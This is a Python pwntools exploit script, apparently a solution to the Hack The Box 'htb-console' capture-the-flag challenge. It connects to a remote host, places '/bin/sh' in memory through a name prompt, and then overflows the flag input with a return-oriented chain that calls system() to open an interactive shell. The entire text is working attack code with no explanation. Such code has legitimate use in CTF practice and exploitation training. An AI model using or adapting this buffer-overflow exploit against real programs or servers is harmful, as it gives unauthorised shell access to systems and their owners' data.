from pwn import *

p = remote('46.101.23.188', 32490)
#p =  process('./htb-console')
elf = context.binary = ELF('./htb-console')
#context.log_level='debug'
offset = 24

system_addr = elf.symbols.system
binsh_addr = 0x4040b0
pop_rdi = 0x401473



payload = flat(
		{
			offset: [
				pop_rdi,
				binsh_addr,
				system_addr
			]
		}
	)

p.recvuntil(">> ")
log.progress("Sending hof...")
p.sendline("hof")
p.recvuntil("Enter your name: ")

log.progress("Sending /bin/sh...")
p.sendline("/bin/sh")
p.recvuntil(">> ")

log.progress("Sending flag...")
p.sendline("flag")
p.recvuntil("Enter flag: ")

log.progress("Sending payload")
p.sendline(flat(payload))

log.critical("Going Interactive...")
p.interactive()
